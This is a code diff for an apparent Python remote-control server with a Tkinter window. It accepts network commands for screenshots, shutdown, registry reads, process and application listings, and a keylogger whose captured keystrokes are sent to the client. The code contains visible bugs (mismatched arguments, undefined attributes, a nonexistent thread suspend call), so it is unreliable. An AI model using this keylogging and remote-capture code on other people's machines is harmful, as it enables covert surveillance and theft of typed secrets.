@@ -15,9 +15,11 @@ import tkinter as tk
 import pynput.keyboard
 import Program
 import Keylog
+from tkinter import *
+import signal
 
-HOST = 'localhost'
-PORT = 64444
+HOST = '192.168.1.3'
+PORT = 4444 #Server Port is listening
 img_bytes = b'\x00\x01\x02...'
 
 FONT = ("Arial", 20, "bold")
@@ -28,56 +30,59 @@ EXIT = "exit"
 
 
 class Server:
-    def __init__(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def __init__(self, host):
+        self.host =HOST  # host
+        print(self.host + " " + str(PORT))
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP
+        self.server.bind((self.host, PORT))
+        self.server.listen(10)
+        print("Server started listening on port " + str(PORT))
         self.clients = []
-        self.nw_lock = threading.Lock()
-        self.nr_lock = threading.Lock()
+        self.ns = None
+        self.nr = None
+        self.nw = None
 
     def start(self):
         try:
-            self.s.bind((HOST, PORT))
-            self.s.listen(2)
-            print("Waiting for Clients")
+            print("SERVER: Waiting for Clients")
             while True:
-                conn, addr = self.s.accept()
-                print("Connected by ", addr)
-                threading.Thread(target=self.handle_client,
-                                 args=(conn, addr)).start()
-        except socket.timeout as timeout:
-            print("Timeout to server: ", addr)
-        except socket.error as error:
-            print("Disconnected to server: ", addr)
+                conn, addr = self.server.accept()
+                print("Connected by", addr)
+                threading.Thread(target=self.handle_client, args=(conn,)).start()
+        except socket.error as ex:
+            print("Server error:", ex)
         finally:
-            self.s.close()
+            self.server.close()
 
+    def stop(self):
+        self.is_running = False  # Signal the server loop to stop
+        sys.exit(0)  # Close the socket to unlock the port
+        
     def handle_client(self, conn, addr):
         self.clients.append(conn)
         try:
             while True:
                 option = conn.recv(1024).decode("utf8")
                 print("Client option: " + option)
-                if option == "LOGIN":
-                    conn.sendall(bytes("Login success", "utf8"))
-
-                elif option == "REGISTER":
-                    conn.sendall(bytes("Register success", "utf8"))
-
-                elif option == "LOGOUT":
-                    conn.sendall(bytes("Logout success", "utf8"))
-
-                elif option == "EXIT":
-                    conn.sendall(bytes("Exit success", "utf8"))
-                    break
-                elif option == "TAKEPIC":
+                if option == "TAKEPIC":
                     self.screenshot(conn)
                 elif option == "SHUTDOWN":
                     self.shutdown()
                 elif option == "REGISTRY":
                     self.pc_registry(conn)
+                elif option == "KEYLOG":
+                    self.keylog(conn)
+                elif option == "PROCESS":
+                    self.process(conn)
+                elif option == "APPLICATION":
+                    self.application(conn)
+                elif option == "QUIT":
+                    break
                 else:
                     conn.sendall(bytes("Option not found", "utf8"))
                     break
+            self.client.shutdown(socket.SHUT_RDWR)
+            self.client.close()
         except socket.timeout as timeout:
             print("Timeout to client: ", addr)
         except socket.error as error:
@@ -275,23 +280,23 @@ class Server:
 
     def hookKey(self):
         self.tklog.resume()
-        open(AppStart.path, "w").close()
+        open(Keylog.path, "w").close()
 
     def unhook(self):
         self.tklog.suspend()
 
     def printkeys(self):
         s = ""
-        with open(AppStart.path, "r") as file:
+        with open(Keylog.path, "r") as file:
             s = file.read()
-        open(AppStart.path, "w").close()
+        open(Keylog.path, "w").close()
         if not s:
             s = "\0"
         self.nw.write(s)
         self.nw.flush()
 
     def keylog(self):
-        self.tklog = threading.Thread(target=KeyLogger.startKLog)
+        self.tklog = threading.Thread(target=Keylog.startKLog)
         s = ""
         self.tklog.start()
         self.tklog.suspend()
@@ -442,7 +447,7 @@ class Server:
                 elif s == "REGISTRY":
                     self.registry()
                 elif s == "TAKEPIC":
-                    self.takepic()
+                    self.screenshot()
                 elif s == "PROCESS":
                     self.process()
                 elif s == "APPLICATION":
@@ -454,16 +459,17 @@ class Server:
         client.close()
 
 class ServerGUI(tk.Frame):
-    def __init__(self, master=None):
+    def __init__(self, master=None, server=None):
         super().__init__(master)
         self.master = master
+        self.server = server  # Store the server instance
         self.init_ui()
 
     def init_ui(self):
         self.master.title("Server")
         self.master.geometry("200x100")
 
-        self.button1 = tk.Button(self, text="Mở server", command=self.open_server)
+        self.button1 = tk.Button(self, text="Open server", command=self.open_server)
         self.button1.pack(pady=20)
 
         self.pack()
@@ -473,16 +479,31 @@ class ServerGUI(tk.Frame):
 
     def process_click(self):
         print("PROCESS command sent to the server.")
+        
+    def on_closing(self):
+        if self.server:
+            self.server.stop()  # Call the server's stop method
+        self.master.destroy()
+
+    def shutdown_server(self):
+        # Implement your server shutdown logic here
+        print("Shutting down the server...")
+        # For example, you could call your Server's shutdown method
 
 def main():
-    server = Server()
+    server = Server('0.0.0.0')
     server_thread = threading.Thread(target=server.start)
     server_thread.start()
 
     root = tk.Tk()
     server_app = ServerGUI(master=root)
+    root.protocol("WM_DELETE_WINDOW", server_app.on_closing)  # Handle window closing event
     server_app.mainloop()
-
+    
+    server.stop()  # You should implement this method in your Server class
+    server_thread.join()  # Wait for the server thread to finish before exiting
+    
 if __name__ == "__main__":
     main()
+
 
